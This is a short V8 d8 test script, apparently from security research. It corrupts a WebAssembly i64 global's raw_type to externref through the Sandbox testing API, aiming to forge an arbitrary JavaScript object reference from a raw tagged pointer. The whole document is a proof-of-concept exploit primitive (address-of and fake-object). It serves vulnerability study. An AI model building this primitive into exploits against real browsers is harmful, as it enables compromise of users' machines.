// C21 H5: direct forge-ref from numeric i64 bytes.
//
// Store a controlled tagged object pointer as an i64 global value, corrupt
// raw_type to externref, then read it through WebAssembly.Global.value.
// This tests whether the sink is only "zero -> Smi(0)" or can manufacture
// arbitrary JS object references from numeric backing storage.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kHeapObjectTag = 1;
const kExternRefRawTypeSmi = 0x160a;

let builder = new WasmModuleBuilder();
builder.addGlobal(kWasmI64, true, false, [kExprI64Const, 0]).exportAs('g');
let instance = builder.instantiate();
let global = instance.exports.g;

let target = {tag: 'forged-ref', marker: 0x1337};
let taggedPtr = BigInt(Sandbox.getAddressOf(target) + kHeapObjectTag);

global.value = taggedPtr;
Sandbox.corruptObjectField(global, 'raw_type', kExternRefRawTypeSmi);

let recovered = global.value;
print(`same=${recovered === target}`);
print(`tag=${recovered && recovered.tag}`);
print(`marker=${recovered && recovered.marker}`);
